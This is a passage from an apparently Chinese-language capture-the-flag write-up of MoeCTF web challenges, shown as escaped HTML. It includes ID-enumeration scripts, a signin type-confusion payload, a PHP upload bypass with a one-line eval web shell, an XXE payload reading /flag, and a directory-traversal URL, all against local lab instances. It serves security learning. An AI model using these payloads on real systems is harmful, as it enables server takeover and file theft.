&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            data[&amp;quot;throttle&amp;quot;] = &amp;quot;0&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            print(&amp;quot;抓地力太小了！&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if &amp;quot;失误了！别紧张，车手，重新来过吧&amp;quot; in ret.text:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            print(&amp;quot;失误了！别紧张，车手，重新来过吧&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            return 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if &amp;quot;moectf{&amp;quot; in ret.text:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            print(ret.text)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            return 1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;car()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;moectf{Beautiful_Drifting!!_EUbAUerqztK_HgTz73ykI5tjKTs6ZkTb}&lt;&#x2F;p&gt;
&lt;h3 id=&quot;da-hai-lao-zhen&quot;&gt;大海捞针&lt;a class=&quot;zola-anchor&quot; href=&quot;#da-hai-lao-zhen&quot; aria-label=&quot;Anchor link for: da-hai-lao-zhen&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import requests
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import time
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;url = &amp;quot;http:&#x2F;&#x2F;localhost:62225&#x2F;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def flag():
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    for i in range(584, 1001):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        time.sleep(0.03)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        print(&amp;quot;{0}..&amp;quot;.format(i))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        ret = requests.get(url, params={
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            &amp;quot;id&amp;quot;: i
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        })
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        print(ret.text)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if &amp;quot;moectf{&amp;quot; in ret.text:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            print(ret.text)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            return 1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;flag()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;flag 在 id &lt;code&gt;920&lt;&#x2F;code&gt; 中，moectf{script_helps_W4ybDNdcii8fJu2uinmgRX6XNZ0PxVOF}&lt;&#x2F;p&gt;
&lt;h3 id=&quot;signin&quot;&gt;signin&lt;a class=&quot;zola-anchor&quot; href=&quot;#signin&quot; aria-label=&quot;Anchor link for: signin&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;h4 id=&quot;0x02-shou-ji-xin-xi&quot;&gt;0x02 收集信息&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x02-shou-ji-xin-xi&quot; aria-label=&quot;Anchor link for: 0x02-shou-ji-xin-xi&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;assert &amp;quot;admin&amp;quot; in users
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;assert users[&amp;quot;admin&amp;quot;] == &amp;quot;admin&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;得知 &lt;code&gt;admin&lt;&#x2F;code&gt; 密码为 &lt;code&gt;admin&lt;&#x2F;code&gt; 。&lt;&#x2F;p&gt;
&lt;h4 id=&quot;0x01-fen-xi-eval&quot;&gt;0x01 分析 eval&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x01-fen-xi-eval&quot; aria-label=&quot;Anchor link for: 0x01-fen-xi-eval&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;p&gt;这串代码存在一个离谱的地方，就是这个 eval 函数，一步步来。&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eval(int.to_bytes(0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164^8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153,160,&amp;quot;big&amp;quot;,signed=True).decode().translate({ord(c):None for c in &amp;quot;\x00&amp;quot;})) # what is it?
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;int.to_bytes()&lt;&#x2F;code&gt; 函数会将一个整数转化为其字节表示，其中一个十六进制数和一个大整数进行异或，将异或的结果转化为160字节长度的字节串，并且是 big endian 字节顺序，再通过 &lt;code&gt;.decode()&lt;&#x2F;code&gt; 将字节转换成字符串，通过 &lt;code&gt;.translate({ord(c):None for c in &quot;\x00&quot;})&lt;&#x2F;code&gt; 移除了所有的 &lt;code&gt;\x00&lt;&#x2F;code&gt; 的字节最后传递给 &lt;code&gt;eval()&lt;&#x2F;code&gt; 函数进行执行。&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(int.to_bytes(0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164^8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153,160,&amp;quot;big&amp;quot;,signed=True).decode().translate({ord(c):None for c in &amp;quot;\x00&amp;quot;}))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# [[0] for base64.b64encode in [base64.b64decode]]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;也就是说，&lt;code&gt;base64.b64encode&lt;&#x2F;code&gt; 其实是 &lt;code&gt;base64.b64decode&lt;&#x2F;code&gt; ，因此下方的 &lt;code&gt;decrypt()&lt;&#x2F;code&gt; 函数其实是下面这样的。&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def decrypt(data:str):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        for x in range(5):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            data = base64.b64decode(data).decode()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        return data
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h4 id=&quot;0x03-fen-xi-gethash&quot;&gt;0x03 分析 gethash&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x03-fen-xi-gethash&quot; aria-label=&quot;Anchor link for: 0x03-fen-xi-gethash&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def gethash(*items):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    c = 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    for item in items:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if item is None:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            continue
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        c ^= int.from_bytes(hashlib.md5(f&amp;quot;{salt}[{item}]{salt}&amp;quot;.encode()).digest(), &amp;quot;big&amp;quot;) # it looks so complex! but is it safe enough?
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return hex(c)[2:]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;程序会 &lt;code&gt;hashed_users = dict((k,gethash(k,v)) for k,v in users.items())&lt;&#x2F;code&gt; 生成一个 dict 存放 username 和其根据 &lt;code&gt;gethash()&lt;&#x2F;code&gt; 函数所得到的值，但是当账号和密码相同时，&lt;code&gt;gethash()&lt;&#x2F;code&gt; 函数均返回 &lt;code&gt;0&lt;&#x2F;code&gt; 。以 &lt;code&gt;{&quot;admin&quot;: &quot;admin&quot;}&lt;&#x2F;code&gt; 为例子，通过运行以上代码可以得到类似回显。&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;item:admin
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;c:102686882367982976480853838608729908860
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;item:admin
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;c:0
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h4 id=&quot;0x04-flag-huo-de-fang-fa&quot;&gt;0x04 FLAG 获得方法&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x04-flag-huo-de-fang-fa&quot; aria-label=&quot;Anchor link for: 0x04-flag-huo-de-fang-fa&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;hashed = gethash(params.get(&amp;quot;username&amp;quot;), params.get(&amp;quot;password&amp;quot;))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for k, v in hashed_users.items():
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if hashed == v:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        data = {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            &amp;quot;user&amp;quot;: k,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            &amp;quot;hash&amp;quot;: hashed,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            &amp;quot;flag&amp;quot;: FLAG if k == &amp;quot;admin&amp;quot; else &amp;quot;flag{YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG}&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        self.send_response(200)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        self.end_headers()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        self.wfile.write(json.dumps(data).encode())
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        print(&amp;quot;success&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        return
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;要获得 FLAG 需要使得 &lt;code&gt;hashed == v&lt;&#x2F;code&gt; ，也就是说需要使得 &lt;code&gt;hashed&lt;&#x2F;code&gt; 的值为 &lt;code&gt;0&lt;&#x2F;code&gt; ，因为 &lt;code&gt;admin&lt;&#x2F;code&gt; 的 hash 值为 &lt;code&gt;0&lt;&#x2F;code&gt; ，但是还需要通过某个手段来绕过这段代码的限制。&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;if params.get(&amp;quot;username&amp;quot;) == params.get(&amp;quot;password&amp;quot;):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    self.send_response(403)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    self.end_headers()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    self.wfile.write(b&amp;quot;YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    print(&amp;quot;same&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过构造&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{&amp;quot;username&amp;quot;:1,&amp;quot;password&amp;quot;:&amp;quot;1&amp;quot;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;进行 5 次 base64 编码得到&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;VjJ4b2MxTXdNVmhVV0d4WFltMTRjRmxzVm1GTlJtUnpWR3R3VDJGNlJsVmFSRXB6WVd4SmQxZHFXbHBsYXpWeVdrY3hUMlJHVmxoaVJrSm9WbGQzTUZVeFl6QmtNVUpTVUZRd1BRPT0=
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;后构造 Payload 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{&amp;quot;params&amp;quot;:&amp;quot;VjJ4b2MxTXdNVmhVV0d4WFltMTRjRmxzVm1GTlJtUnpWR3R3VDJGNlJsVmFSRXB6WVd4SmQxZHFXbHBsYXpWeVdrY3hUMlJHVmxoaVJrSm9WbGQzTUZVeFl6QmtNVUpTVUZRd1BRPT0=&amp;quot;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;即可得到回显如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{&amp;quot;user&amp;quot;: &amp;quot;admin&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt; &amp;quot;hash&amp;quot;: &amp;quot;0&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt; &amp;quot;flag&amp;quot;: &amp;quot;moectf{C0nGUrAti0ns!_y0U_hAve_sUCCessFUlly_siGnin!_iYlJf!M3rux9G9Vf!Jox}&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;moetu-chuang&quot;&gt;moe图床&lt;a class=&quot;zola-anchor&quot; href=&quot;#moetu-chuang&quot; aria-label=&quot;Anchor link for: moetu-chuang&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;通过访问 &lt;code&gt;.&#x2F;upload.php&lt;&#x2F;code&gt; 可以得到内容如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$targetDir = &amp;#39;uploads&#x2F;&amp;#39;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$allowedExtensions = [&amp;#39;png&amp;#39;];
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;if ($_SERVER[&amp;#39;REQUEST_METHOD&amp;#39;] === &amp;#39;POST&amp;#39; &amp;amp;&amp;amp; isset($_FILES[&amp;#39;file&amp;#39;])) {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    $file = $_FILES[&amp;#39;file&amp;#39;];
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    $tmp_path = $_FILES[&amp;#39;file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if ($file[&amp;#39;type&amp;#39;] !== &amp;#39;image&#x2F;png&amp;#39;) {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        die(json_encode([&amp;#39;success&amp;#39; =&amp;gt; false, &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;文件类型不符合要求&amp;#39;]));
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if (filesize($tmp_path) &amp;gt; 512 * 1024) {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        die(json_encode([&amp;#39;success&amp;#39; =&amp;gt; false, &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;文件太大&amp;#39;]));
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    $fileName = $file[&amp;#39;name&amp;#39;];
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    $fileNameParts = explode(&amp;#39;.&amp;#39;, $fileName);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if (count($fileNameParts) &amp;gt;= 2) {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        $secondSegment = $fileNameParts[1];
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if ($secondSegment !== &amp;#39;png&amp;#39;) {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            die(json_encode([&amp;#39;success&amp;#39; =&amp;gt; false, &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;文件后缀不符合要求&amp;#39;]));
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    } else {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        die(json_encode([&amp;#39;success&amp;#39; =&amp;gt; false, &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;文件后缀不符合要求&amp;#39;]));
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    $uploadFilePath = dirname(__FILE__) . &amp;#39;&#x2F;&amp;#39; . $targetDir . basename($file[&amp;#39;name&amp;#39;]);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if (move_uploaded_file($tmp_path, $uploadFilePath)) {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        die(json_encode([&amp;#39;success&amp;#39; =&amp;gt; true, &amp;#39;file_path&amp;#39; =&amp;gt; $uploadFilePath]));
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    } else {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        die(json_encode([&amp;#39;success&amp;#39; =&amp;gt; false, &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;文件上传失败&amp;#39;]));
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;else{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    highlight_file(__FILE__);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;?&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过分析可以得知只对文件名的第二部分进行校对，因此可以通过修改文件名为 &lt;code&gt;shell.png.php&lt;&#x2F;code&gt; 进行绕过，构造 Payload 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;?php eval($_POST[1]); ?&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过蚁剑一把梭可以得到 flag 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;moectf{hmmm_improper_filter_UHTtyCKaTduCaSvieWWJwjduiQz-SEqV}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;liao-jie-ni-de-zuo-jia&quot;&gt;了解你的座驾&lt;a class=&quot;zola-anchor&quot; href=&quot;#liao-jie-ni-de-zuo-jia&quot; aria-label=&quot;Anchor link for: liao-jie-ni-de-zuo-jia&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;通过 Network 可以发现 POST 请求，发现 xml ，尝试 XXE ，构造 Payload如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;xml_content=%0d%3c!DOCTYPE%20shell%5b%0d%0a%3c!ENTITY%20en%20SYSTEM%20%22%2fflag%22%3e%0d%0a%5d%3e%0a%3cxml%3e%3cname%3e1%26en%3b2%3c%2fname%3e%3c%2fxml%3e
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;即可得到 flag 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;moectf{Which_one_You&amp;#39;ve_Chosen?xK1hOAilRmh6oK1kQehxQefFcpFo29ME}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;meotu-chuang&quot;&gt;meo图床&lt;a class=&quot;zola-anchor&quot; href=&quot;#meotu-chuang&quot; aria-label=&quot;Anchor link for: meotu-chuang&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;通过上传图片后，可以得到以下 url&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;http:&#x2F;&#x2F;localhost:59661&#x2F;images.php?name=64dba568f03b0_1.png
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;使用目录穿越查看根目录的 &lt;code&gt;&#x2F;flag&lt;&#x2F;code&gt; ，url 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;http:&#x2F;&#x2F;localhost:59661&#x2F;images.php?name=..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以得到以下内容&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;hello~
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Flag Not Here~
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Find Somewhere Else~
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;!--Fl3g_n0t_Here_dont_peek!!!!!.php--&amp;gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Not Here~~~~~~~~~~~~~ awa
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过访问 &lt;code&gt;Fl3g_n0t_Here_dont_peek!!!!!.php&lt;&#x2F;code&gt; 可以得到以下内容&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;highlight_file(__FILE__);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;if (isset($_GET[&amp;#39;param1&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;param2&amp;#39;])) {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    $param1 = $_GET[&amp;#39;param1&amp;#39;];
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    $param2 = $_GET[&amp;#39;param2&amp;#39;];
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if ($param1 !== $param2) {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        
